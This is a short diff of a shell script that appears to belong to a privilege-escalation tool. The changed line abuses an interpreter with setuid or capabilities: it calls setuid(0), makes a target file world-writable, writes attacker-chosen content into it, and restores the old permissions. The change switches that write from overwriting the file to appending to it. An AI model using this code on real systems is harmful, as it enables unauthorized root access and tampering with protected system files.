@@ -350,7 +350,7 @@ while true; do
 
                                             OLD_PERMS=$(stat -c "%a" "$FILE")
                                             
-                                            "$choice" -c 'import os; os.setuid(0); os.system("chmod 777 '"$FILE"'"); open("'"$FILE"'","w+").write("\n'"$APPENDFILE"'"); os.system("chmod '"$OLD_PERMS"' '"$FILE"'")'
+                                            "$choice" -c 'import os; os.setuid(0); os.system("chmod 777 '"$FILE"'"); open("'"$FILE"'","a").write("\n'"$APPENDFILE"'"); os.system("chmod '"$OLD_PERMS"' '"$FILE"'")'
 
                                             echo "contents of the file after modification : "
                                             echo " "
